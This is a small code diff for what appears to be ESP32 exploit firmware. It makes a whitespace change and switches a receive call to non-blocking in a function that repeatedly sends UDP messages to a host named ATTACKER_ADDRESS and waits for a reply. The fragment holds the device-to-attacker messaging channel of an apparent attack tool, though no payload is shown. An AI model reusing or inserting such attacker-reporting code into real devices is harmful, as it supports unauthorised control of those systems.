@@ -88,7 +88,7 @@ void app_main(void) {
         .sin_port = htons(ATTACKER_PORT)
     };
     inet_pton(AF_INET, ATTACKER_ADDRESS, &(attacker_addr.sin_addr));
-
+    
     exp_arg_t *arg = malloc(sizeof(exp_arg_t));
     arg->sock = attacker_sock; 
     arg->addr = attacker_addr;
@@ -105,7 +105,7 @@ char send_msg(char* msg, int msg_socket, struct sockaddr_in* to_addr) {
     while (answer == '\0') {
         int read_bytes = sendto(msg_socket, msg, strlen(msg), 0, (struct sockaddr*) to_addr, sizeof(struct sockaddr_in));
         ESP_LOGI(TAG, "sent %s", msg);
-        recv(msg_socket, &answer, sizeof(answer), 0);
+        recv(msg_socket, &answer, sizeof(answer), MSG_DONTWAIT);
     }
 
     return answer;
